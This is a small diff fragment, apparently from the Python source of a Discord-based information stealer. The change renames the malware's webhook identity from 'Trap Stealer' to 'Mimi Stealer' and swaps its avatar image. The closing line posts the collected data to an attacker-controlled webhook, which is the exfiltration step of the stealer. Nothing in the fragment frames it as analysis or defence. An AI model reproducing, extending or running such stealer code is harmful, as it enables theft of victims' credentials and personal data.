                             "icon_url": "https://images-ext-2.discordapp.net/external/t2jmsVmF2FvFLwOKUYc8jVDiBS32FDKP7pdFuepWwMU/https/cdn3.emoji.gg/emojis/3304_astolfobean.png"}
                     }
                 ],
-                "username": "Trap Stealer",
-                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                "username": "Mimi Stealer",
+                "avatar_url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif",
                 "attachments": []
             }
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
